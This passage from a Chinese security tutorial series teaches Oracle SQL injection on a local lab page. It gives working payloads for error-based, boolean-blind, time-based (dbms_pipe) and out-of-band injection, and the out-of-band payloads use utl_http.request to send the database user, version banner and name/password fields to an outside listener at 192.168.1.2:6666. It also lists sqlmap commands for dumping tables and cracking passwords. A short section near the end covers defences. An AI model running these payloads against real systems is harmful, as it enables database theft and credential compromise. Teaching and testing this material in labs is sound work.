![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlflV0ViaQYszo8yttFhLicP0QQWMdlgNfP0dYJXbFpMh8eQjaAgNmibo1Q/640?wx_fmt=png)

SQL 注入链接如下：

```
1 and 1=utl_inaddr.get_host_name((select (SELECT CONCAT("name","pwd") FROM FLAG where rownum=1) from dual)) --
```

下图中是用户的账号和密码，可以使用其他的报错函数来测试。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlIcYZJ13BDw5oKUXRLB3bPGtibd799a0aq3djIYRXhsOls3ruvNAYUicg/640?wx_fmt=png)

五. 布尔盲注实践
=========

盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。个人理解，之前的注入会将数据库的信息反馈至前端，而盲注前端不能显示，只能进行猜解。

盲注本质上就是页面无法提供回显的时候进行注入操作。布尔型盲注表示输入 and 1 或者 and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息。常用函数如下：

*   length()  
    返回字符串 str 的长度，以字节为单位
    
*   substr()  
    从特定位置开始的字符串返回一个给定长度的子字符串
    
*   ascii()  
    输出某个字符的 ascii 码值，ascii 码共 127 个，此处注意 ascii 函数处理单个字符，如果是字符串则会处理第一个字符，例如 select ascii(‘h’) 返回 104
    

在 Oracle 布尔盲注实验中，可以是普通猜解的方法，也可以使用某些函数来辅助猜解，如前面提到的 decode 函数，以及 instr 函数等。布尔盲注测试方法如下：

*   普通猜解
    
*   Decode 方法
    
*   Instr 方法
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlEerFuUibvzXGC5RD8GpGH6QCu4AFiaoibHOiaH9Vt5cqpesO4sYB6a4ia5w/640?wx_fmt=png)

1. 普通猜解
-------

具体步骤如下：  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlOqmMJjtDkH5DqZia8r9cn1bGZzKIuyTOtR0sicOTEZ5BRxibX2BSBviaLQ/640?wx_fmt=png)

**第一步，获取当前用户下的数据表长度以及每个字符。**  
SQL 语句如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlsqsJw49EwyR1z8J9cabakFXfT7BuuULiaA81m1YD0aMIPs0gpjvFIXQ/640?wx_fmt=png)

当我们使用 LENGTH() 计算长度时，如果异常显示则表示失败，如下图没有显示表格。

```
1 and 3=(SELECT LENGTH(table_name) from user_tables where rownum=1)--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlOj6xfbFeicRpdiaz5GsJMROz5RtZFiaxf0mSERJRkdQyIfApicbj38hhhw/640?wx_fmt=png)

如果正常显示，则表示成功，该表格的长度为 4。

```
1 and 4=(SELECT LENGTH(table_name) from user_tables where rownum=1)--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGleaicgb8ic1snHxScibVXIw0ViaRibG91OicFCJSrfWkybXUefux4zrQtafvg/640?wx_fmt=png)

**第二步，爆破数据表每个字符。**  
猜测数据库表的每个字符，使用字符截取函数 substr 和 ascii 函数。

```
select ascii(substr(table_name,1,1)) from user_tables WHERE rownum=1;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlDxfmPcYia1klLQN0KUaay2bxT7z6dlkuGXwG7yiaVtamsgmIsVTV3zYA/640?wx_fmt=png)

只有页面正常显示才能推出每个字符的 ASCII，，比如 ASCII 码查询 67，对应字母 C 则无显示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlwdX7jZA8XLUWlIq12FQwDkiaURHlsicCv4TTBEB23thiafUrG0KlYLYNg/640?wx_fmt=png)

ASCII 码表如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlFZOUSDk5ITKUwCibhHnt6SPEWicnIy3wLNtZGbOZfm6QD4tViaKtZN1uw/640?wx_fmt=png)

当前数据表的首字母的 ASCII 是 68，也即 D，依次爆出的字母是 E、M、O。所以数据表名为：

*   DEMO
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlybkyYpJ1xSEgLtXUPYLvWNHCgXP8yDIyLDW8Hmw9You6ved08JPbUA/640?wx_fmt=png)

**第三步，爆破指定表下的字段名长度。**  
我们先猜解表第一个字段的长度，SQL 语句如下：

```
select LENGTH(column_name) from user_tab_columns where table_name='DEMO' and rownum=1;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGliaDFocs47Z9cPrQlia2XnL3cCCtAo0e7V1rbLGmAFjr0w47L8pT6IRmg/640?wx_fmt=png)

对应的 SQL 注入链接如下，当 DEMO 表的第一个字段长度为 2 时正确显示。

```
1 and 2=((select LENGTH(column_name) from user_tab_columns where table_name='DEMO' and rownum=1)) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl9LnwkzBgWqkSWKnPWjXefmI0nXPAtMEFVF0U7X33wu7HW6tlD0SxpA/640?wx_fmt=png)

**第四步，猜解每个字段名的字符。**  
SQL 语句如下：

```
select ascii(substr(column_name,1,1)) from user_tab_columnswhere table_name='DEMO' and rownum=1;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlXuicnibjdcn7dwrVaWLyDx9ASdfqOa2ZKxoZPgY1zzvRArY29VWCUAbw/640?wx_fmt=png)

下面正常显示猜解出来是字母 “I”，最终确定这两个字母是 ID。

```
1 and 73=((select ascii(substr(column_name,1,1)) from user_tab_columns where table_name='DEMO' and rownum=1)) --
1 and 68=((select ascii(substr(column_name,2,1)) from user_tab_columns where table_name='DEMO' and rownum=1)) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlG98ics1J1oewWicFSIE3ibFTnlPUQpLbIKedF7Ma2CZ1ZJVZvPpRxm5MQ/640?wx_fmt=png)

当然，这个过程也可以使用 BusrpSuite 去爆破。

同理可以获取第二个字段的长度是 4，对应的 ASCII 是 78、65、77、69，也即 NAME。第三个字段为 AGE，第四个字段为 SEX。

```
1 and 78=((select ascii(substr(column_name,1,1)) from user_tab_columns where table_name='DEMO' and rownum=1 and column_name <> 'ID' ))--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlWuyTErYmO0zv469dNfkW0Yibf3WcGV9IBUN6KP1vriahYbGMXTlSnJYQ/640?wx_fmt=png)

**第五步，爆字段内容。**  
如果我们获取了管理用户表 NAME 和 PWD，接下来获取字段内容。

```
1 and 102=((select ASCII(substr(CONCAT(NAME, AGE),1,1))FROM DEMO  where rownum=1 ))--
```

下面显示异常，说明当前 NAME 和 AGE 内容长度不是 102。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl4JoWibh8n4ibEkhsttaFWDXaf8tenEkvrRRMtx280Uo9TMAuoA3MESxw/640?wx_fmt=png)

最终数字为 11 显示正常。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlppUvMQrWchYWMmb4nfgmticslibxQ6D4yn0HH2u2BUHVRLN34fBc6X4A/640?wx_fmt=png)

接着获取第一个用户名 eastmount 的字符为 “e”。

```
1 and 101=((select ASCII(substr(CONCAT(NAME, AGE),1,1)) FROM DEMO  where rownum=1 ))--
```

依次获得 eastmount。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlHfYvbt7icH5CZiavianEXb5KPXQvyx8YB6LnKSTAExsNSRzmwT3BQYBiaQ/640?wx_fmt=png)

2.DECODE 函数盲注
-------------

Decode 的使用方法如下，当条件等于值 1 时就得到返回值 1。

*   decode(条件, 值 1, 返回值 1,
    
    值 2, 返回值 2,… 值 n, 返回值 n, 缺省值)
    

**第一步，获取信息。**  
SQL 语句如下：

```
select decode(length(user),9,1,0) from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlenmVtFm3bru7GUPsPgvL7k20F09ZkXEqicicicY9ET4j2PPiacNvlGu6Ug/640?wx_fmt=png)

页面显示正常，说明用户长度是 9。

```
1 and 1=(select decode(length(user),9,1,0) from dual)--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlYtNJQXy5wvdiaIBG5CTGmNVX3Hs97oZccugJ0yTj7PmNgsasXRca1cQ/640?wx_fmt=png)

接下来可以使用 BP 爆破获取用户名。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlowkta9yfHyDnIRyVeaJMCER57yRicTPhNf1Zn21l0eLl65udBvD3QqA/640?wx_fmt=png)

**第二步，获取当前用户下的第一个表。**

```
1 and 1=(select decode(length(table_name),4,1,0) from user_tables where rownum=1)--
```

页面实现正常，说明表名长度是 4，对应应该是 DEMO。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlRGfQfuAq0rsJcr1OibVTPcicrc5u1sKAibMCnvmz1D5icHjDhkicaj9icazw/640?wx_fmt=png)

**第三步，猜解表名称。**

```
1 and  1=(select decode(ascii(substr(table_name,1,1)),68,1,0) from user_tables where rownum=1)--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlN518NrkMKwgzGmHb8iacq5MXw7YibGN8TCiah0QWO3k2lNQl9StKYIOSw/640?wx_fmt=png)

使用 BP 爆破，结果是 DEMO。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlNlyLfFlpiapY3V99YTQuRriac4qrGM6jWFiaRic6icZcJnhQadflib7QuXlw/640?wx_fmt=png)

接下来爆破 DEMO 表下字段以及字段对应内容，步骤和前面的很相似。

3.INSTR 函数盲注
------------

函数 instr 的使用方法：

*   instr(string1,string2)
    
    在 string1 中找到 string2 所在的位置，找到返回其索引。
    

对应 SQL 语句如下：

```
SELECT INSTR('substr', 'str') from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlKjnicqKgW8LpslqiaxaYxPba2ColdvnhJV6Q2cSsc5eXPyndv3GNsYPQ/640?wx_fmt=png)

下面简单列举下 Cream 老师相关的 SQL 语句，大家可以进行尝试。

*   select instr((select user from dual),‘TEST’) from dual;  
    猜解用户名是 TEST，则返回 1
    
*   select instr((select length(user) from dual),4) from dual;  
    猜解用户名的长度，如果是 4 则返回 1
    
*   select instr((select length(table_name) from user_tables where rownum=1),4) from dual;  
    判断当前用户的第一个表的名称长度是否是 4
    
*   select instr(substr((select table_name from user_tables where rownum=1),1,1),‘D’) from dual;  
    判断表名称的每个字符，第一个字符是不是 D，可以结合 BP 爆破
    

同理可以获取表中的字段长度和内容。

六. 延时盲注实践
=========

在 Oracle 延时注入利用过程中需要使用 DECODE、DBMS_PIPE.RECEIVE_MESSAGE 等函数来延时数据库的处理时间，最后测试者可以通过网页的加载时间来判断注入结果。

延时注入可用的函数 / 方法：

*   DECODE  
    此处不再介绍
    
*   DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)  
    表示从 RDS 管道返回的数据需要等待 5 秒，一般情况下可以以 PUBLIC 权限使用该函数
    
*   select count(*) from all_objects  
    大量统计操作辅助延时注入，延长时间不易控制
    

注意：执行 “SELECT DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5) from dual” 返回值是 1。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlXBayrXpBhAWD9HDrV2icibwzy6f09vpW50rlk7jQE6xZIv9Zj4xPLibNA/640?wx_fmt=png)

**第一步，测试延迟代码。**  
SQL 语句如下，可以看到网络加载时间是 5S，注意该函数 5s 后的返回值是 1。

```
SELECT dbms_pipe.receive_message('RDS', 5) from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl9nuJAfByJYh1ia3lWVmibNZ3jOicrZNgwhuwGnXcyL0yHhVEp7pZyETEg/640?wx_fmt=png)

SQL 注入链接如下：

```
1 and 1= dbms_pipe.receive_message('RDS', 5)--
```

**第二步，调用 DECODE 函数进行延时判断。**

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGllnUHtUvztGlGlOib5dEZ7MWPaCMkfBSibYaxWibQY0ibDh4HGyDicprs6tw/640?wx_fmt=png)

SQL 语句如下，该语句表示：

*   select DECODE(condition,value,
    
    dbms_pipe.receive_message(‘RDS’, 5),0) from dual 当 condition=value 就返回 dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待 5 秒时间，从而达到延时注入的目的。
    

```
错误select decode(substr(user,1,1),'T',dbms_pipe.receive_message('RDS',5),0) from dual;正确（EASTMOUNT）select decode(substr(user,1,1),'T',dbms_pipe.receive_message('RDS',5),0) from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlVNDt8Lw8TLApn261xibrYqdaRCGRxCIg8CgYTVGFQEuQFISd8RGMJNw/640?wx_fmt=png)

对应 SQL 注入代码如下：

```
1 and 1=(select decode(substr(user,1,1),'E',dbms_pipe.receive_message('RDS',5),0) from dual)--
```

可知用户名第一个字符是 E，使用 BP 爆破，当前用户名为 EASTMOUNT。

**第三步，通过延迟注入获取表名 DEMO。**  
如果错误显示会反馈异常结果。

```
http://127.0.0.1/sql-test02.php?id=1 and 1=(select decode(substr(table_name,1,1),'D',dbms_pipe.receive_message('RDS',5),0) from user_tables where rownum=1)--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlszADcPC83bDEIm2whPl2Qia6nXZcWMT1DtpG567lichMzHnyVQVtCTOg/640?wx_fmt=png)

如果正常注入则延迟显示正常结果，比如 DEMO 的首字母 D。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlvyibpaX7gRKd3JM6WohBtxAxhy9Wlg4T6yGe0QbsJsLEMsxBV7iagDzw/640?wx_fmt=png)

后续步骤参考前面的步骤即可。

七. 带外注入实践
=========

Oracle 的带外注入和 DNSLOG 很相似，需要使用网络请求的函数进行注入利用，其中可以进行网络请求的函数有:

*   UTL_HTTP.REQUEST
    
*   UTL_INADDR.GET_HOST_ADDRESS
    
*   SYS.DBMS_LDAP.INIT
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlxwqHXmYDDKO2sFBhmXIIHJKUJgTEibwIkmNtGMRibTPyicD4LNOZBsMuA/640?wx_fmt=png)

**第一步，首先检测函数是否能用。**

```
1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlOBysW9aU0pOHWM4f6EC8dYnxWZcBhwwoibbYcWF4NIiax9z9rDWbxUsw/640?wx_fmt=png)

网页加载正常，则说明该函数可以使用。其中还函数返回值是请求的返回值

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlNPVmDHCd2hZO8ZYeNy0wSkibncV3KKpLWCv6ruAY2uDhiaVpbfNsWFsw/640?wx_fmt=png)

使用方法，其中 || 放在 URL 需要 URL 编码。切记！！！

```
and utl_http.request('http://域名或者ip:端口/'||(注入的语句))=1 --，
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlOYs8tHrOYaKh4HdmDTGo7lZ9XFvs3cPjX3IgIB5QVmcPnWJBa1Wh8Q/640?wx_fmt=png)

发送请求（获取当前用户名）：

```
1 and utl_http.request('http://192.168.1.2:6666/'%7c%7c(SELECT user FROM dual))=1--
```

**第二步，信息收集。**

```
http://192.168.1.6:81/orcl.php?id=1 and utl_http.request('http://192.168.1.2:6666/'%7c%7c(SELECT user FROM dual))=1--
```

收到数据如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlEKWcYtDn6bNzRE4UibuViagOA4KzoianzKetuUtnDGRxwibxBeIvNk6jJQ/640?wx_fmt=png)

获取 Banner 信息。

```
http://192.168.1.6:81/orcl.php?id=1 and utl_http.request('http://192.168.1.2:6666/'%7c%7c(select banner from sys.v_$version where rownum=1))=1--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlicibcGEiaS36v2Hc1gic28ffw7xE4XfbfadEcCJOvKlSz9bw6b5Tjediaxw/640?wx_fmt=png)

获取字段内容。

```
http://192.168.1.6:81/orcl.php?id=1 and utl_http.request('http://192.168.1.2:6666/'%7c%7c(SELECT CONCAT("name","password") FROM STU where rownum=1))=1--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl6yjSC5Lm6hQ7XW3eomVJpJXibObjiaibVIOy7apX5qxyPzung2sibc9nKw/640?wx_fmt=png)

八. Oracle 手工注入以及自动化工具 SQLMAP 使用
===============================

下一篇文章讲详细介绍 SQLMAP 的用法。

1. 基本使用方法

*   检测注入点  
    
    python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle
    
*   查看所有数据库名  
    
    python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle --dbs
    
*   查看当前用户的权限  
    
    python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle --privileges
    
*   是否是管理员  
    
    --is-dba
    
*   所有用户  
    
    --users
    
*   当前用户  
    
    --current-user
    
*   当前数据库  
    
    --current-db
    
*   破解当前用户密码  
    
    --passords
    
*   获取系统信息  
    
    --hostname
    
*   获取数据库信息  
    
    --banner
    
*   获取数据库用户角色  
    
    --roles
    

2. 获取当前数据库下表

*   python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle -D TEST --tables
    

3. 获取当前数据库下指定表下的字段名

*   python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle -D TEST -T STU --columns
    

4. 获取字段内容

*   python2 sqlmap.py -u http://192.168.1.6:81/orcl.php?id=1 --dbms=oracle -D TEST -T STU -C NAME,PASSWORD --dump
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlhc2A0hsxAbSicDgSwkKV5zTTAoWU8Ip5eEQ9DReQWLOerhrxkiaxGHVg/640?wx_fmt=png)

九. Oracle 注入防御
==============

Oracle 编程路线通常涉及这些相关知识，如下图所示：

*   安全开发
    
*   代码审计
    
*   安全运维
    
*   自动化工具
    
*   红蓝对抗
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGle2NGD7eAEpD0KHj5qAV4WlcvMjbrxU4MmM6VlFaicpeM0KllyV5ianbg/640?wx_fmt=png)

Oracle 其他的安全性问题如下，后续结合 ATT&CK 框架介绍。

*   Oracle 权限控制不当，读写文件
    
*   Oracle 提权
    
*   Oracle 执行系统命令
    
*   反序列化漏洞
    
*   身份管理器漏洞
    
*   Oracle Database Server 远程安全漏洞（CVE-2019-2518）
    

那么，Oracle 注入如何防御呢？下面 Creaml 傲视简单介绍几种方法。

*   1. 代码层防御技术  
    使用参数化查询语句、验证输入、规范化等技术，如 JAVA 中使用 JDBC 框架，C# 使用 ADO.NAT 框架，PHP 使用 PDO 架构等。Oracle PL/SQL 在数据库代码层也可以使用参数化方式去查询，它使用带有编号的冒号字符去绑定参数来达到防注入的目的。
    
*   2. 输入验证  
    任何输入的数据均是不可信的，可以对不可信数据进行验证，如使用黑白名单过滤等。在 JAVA 中可以使用定义一个输入验证类，实现 javax.faces.validator.Validator 接口，对用户输入进行验证。C# 可以使用某些具有验证功能的控件对用户输入进行验证。PHP 中可以使用正则表达式验证用户输入，或者使用特定功能函数判断输入是否合法。
    
*   3. 输出编码
    
*   4. 规范化
    

十. 总结
=====

写到这里，这篇文章就介绍完毕，希望您喜欢，本文主要介绍 Oracle 注入漏洞知识，文章非常长，作者也花费了很长时间，希望对您有帮助，后续我们将结合实战和 CTF 介绍几个 SQL 注入的案例。再次感谢 Cream 好友兼老师。

*   一. Oracle 基础介绍  
    1. 数据库介绍  
    2.Oracle 安装配置  
    3. 常见注入类型
    
*   二. Oracle 数据库元数据获取
    
*   三. 联合注入实践
    
*   四. 报错注入实践
    
*   五. 布尔盲注实践  
    1. 普通猜解  
    2.DECODE 函数盲注  
    3.INSTR 函数盲注
    
*   六. 延时盲注实践
    
*   七. 带外注入实践
    
*   八. Oracle 手工注入以及自动化工具 SQLMAP 使用
    
*   九. Oracle 注入防御
    

学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全和系统安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，深知自己很菜，得努力前行。编程没有捷径，逆向也没有捷径，它们都是搬砖活，少琢磨技巧，干就对了。什么时候你把攻击对手按在地上摩擦，你就赢了，也会慢慢形成了自己的安全经验和技巧。加油吧，少年希望这个路线对你有所帮助，共勉。

前文分享（下面的超链接可以点击喔）：

*   [[网络安全] 一. Web 渗透入门基础与安全术语普及](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483786&idx=1&sn=d9096e1e770c660c6a5f4943568ea289&chksm=cfccb147f8bb38512c6808e544e1ec903cdba5947a29cc8a2bede16b8d73d99919d60ae1a8e6&scene=21#wechat_redirect)
    
*   [[网络安全] 二. Web 渗透信息收集之域名、端口、服务、指纹、旁站、CDN 和敏感信息](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483849&idx=1&sn=dce7b63429b5e93d788b8790df277ff3&chksm=cfccb104f8bb38121c341a5dbc2eb8fa1723a7e845ddcbefe1f6c728568c8451b70934fc3bb2&scene=21#wechat_redirect)
    
*   [[网络安全] 三. 社会工程学那些事及 IP 物理定位](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247483994&idx=1&sn=1f2fd6bea13365c54fec8e142bb48e1d&chksm=cfccb297f8bb3b8156a18ae7edaba9f0a4bd5e38966bdaceeff03a5759ebd216a349f430f409&scene=21#wechat_redirect)
    
*   [[网络安全] 四. 手工 SQL 注入和 SQLMAP 入门基础及案例分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484068&idx=1&sn=a82f3d4d121773fdaebf1a11cf8c5586&chksm=cfccb269f8bb3b7f21ecfb0869ce46933e236aa3c5e900659a98643f5186546a172a8f745d78&scene=21#wechat_redirect)
    
*   [[网络安全] 五. XSS 跨站脚本攻击详解及分类 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484381&idx=1&sn=a1d459a7457b56b02e217f39e5161338&chksm=cfccb310f8bb3a06442b001fc7b38a0363b9fbd4436f450b0ce6fa2eeb5c796fc936ceb5d6fa&scene=21#wechat_redirect)
    
*   [[网络安全] 六. XSS 跨站脚本攻击靶场案例九题及防御方法 - 2](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485174&idx=1&sn=245b812489c845e875cf4bc4763747b7&chksm=cfccb63bf8bb3f2d537f36093de80dbeed5a340b141001d3ef8a9ac9d6336e0aaf62b013a54c&scene=21#wechat_redirect)
    
*   [[网络安全] 七. Burp Suite 工具安装配置、Proxy 基础用法及暴库入门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485381&idx=1&sn=9a0230cf22eba0a24152cb0e73a37224&chksm=cfccb708f8bb3e1ecf68078746521191921f41d19a0b82cb3f097856dad7a85c4d9c34750b3f&scene=21#wechat_redirect)
    
*   [[网络安全] 八. Web 漏洞及端口扫描之 Nmap、ThreatScan 和 DirBuster](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485437&idx=1&sn=2a7179464207fa68b708297ec0db6f00&chksm=cfccb730f8bb3e2629edb5ca114de79723e323512be9538a4d512297f8728a3a9d7718389b60&scene=21#wechat_redirect)
    
*   [[网络安全] 九. Wireshark 安装入门及抓取网站用户名密码 - 1](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485465&idx=1&sn=8e7f1f5790bfe754affe0599a3fce1ee&chksm=cfccb8d4f8bb31c2ca36f6467d700f4e4d7821899a6d5173ac0b525f0f6227c8392252b5c775&scene=21#wechat_redirect)
    
*   [[网络安全] 十. Wireshark 抓包原理、ARP 劫持、MAC 泛洪及数据追踪](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485551&idx=1&sn=15f00e14f4376e179a558444de8ef0a5&chksm=cfccb8a2f8bb31b456499a937598e750661841b5ca166a12073e343a049737fa3131fd422dc5&scene=21#wechat_redirect)
    
*   [[网络安全] 十一. Shodan 搜索引擎详解及 Python 命令行调用](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485599&idx=1&sn=0c60c042911fc79287417c2385550430&chksm=cfccb852f8bb3144a89f6b0d0df6c185a208aa989d98f8c7e3b7d741dedc371b3ecb4e70a747&scene=21#wechat_redirect)
    
*   [[网络安全] 十二. 文件上传漏洞 (1) 基础原理及 Caidao 入门知识](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485787&idx=1&sn=0c75cf81c4234031273bced4dff0b25c&chksm=cfccb996f8bb3080fe9583043b43665095fd6935a4147a2bb0d1ab9b91a6cde99da4747c5201&scene=21#wechat_redirect)
    
*   [[网络安全] 十三. 文件上传漏洞 (2) 常用绕过方法及 IIS6.0 解析漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485833&idx=1&sn=a613116633338ca85dfd1966052b0b02&chksm=cfccb944f8bb305296a32dac7f0942e727d66dc9f710bfb82c3597500e97d39714ecd2ed18cf&scene=21#wechat_redirect)
    
*   [[网络安全] 十四. 文件上传漏洞 (3) 编辑器漏洞和 IIS 高版本漏洞及防御](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485871&idx=1&sn=e6d0248e483dea9616a5d615f852eccb&chksm=cfccb962f8bb3074516c1ef8e01c7cb00a174fa5b1a51de3a49b13fd8c7846deeaf6d0e24480&scene=21#wechat_redirect)
    
*   [[网络安全] 十五. 文件上传漏洞 (4)Upload-labs 靶场及 CTF 题目 01-10](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488340&idx=1&sn=5b7bf5602294586f819340bd6190a34d&chksm=cfcca399f8bb2a8f746fc09c7142facc8ea17c008ba46dee423b90ff6abb3cd4486edf52d201&scene=21#wechat_redirect)
    
*   [[网络安全] 十六. 文件上传漏洞 (5) 绕狗一句话原理和绕过安全狗](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488396&idx=1&sn=67c1b13f041040c09c236bba99edfe0a&chksm=cfcca341f8bb2a5729778490db7441a4ddfdfa05dcc5f6322b4860db7780056f9f05f5bc0b3d&scene=21#wechat_redirect)  
    
*   [[网络安全] 十八. Metasploit 技术之基础用法万字详解及 MS17-010 漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488255&idx=1&sn=28b1f54fd420a0145cb95b842a36c567&chksm=cfcca232f8bb2b243bf4cbf5c1741c6af2c1fc666985d34b4f6b4a6ee3161d18975bb5ea18fc&scene=21#wechat_redirect)
    
*   [[网络安全] 十九. Metasploit 后渗透技术之信息收集和权限提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488639&idx=1&sn=dddd54eb0ba7cfdf71113a1f4a5c6548&chksm=cfcca4b2f8bb2da44c975ca12f16b4b76af351be4711ac7e77ca8622450a15c3af0172be3f9e&scene=21#wechat_redirect)
    
*   [[网络安全] 二十. Metasploit 后渗透技术之移植漏洞、深度提权和后门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488738&idx=1&sn=8106362219d99ae6deb8aeca1f6b1dff&chksm=cfcca42ff8bb2d397c44b839700d92fd22e4ac60c403b96cba734bc523cb258dbd0db5309952&scene=21#wechat_redirect)
    
*   [[网络安全] 二十一. Chrome 密码保存渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488883&idx=1&sn=65c362cc4c3958aa747716d17b29eeb3&chksm=cfcca5bef8bb2ca895525a1964425d1dfe74001a33e3b59b18bf902539cfc4d941dd96c33863&scene=21#wechat_redirect)
    
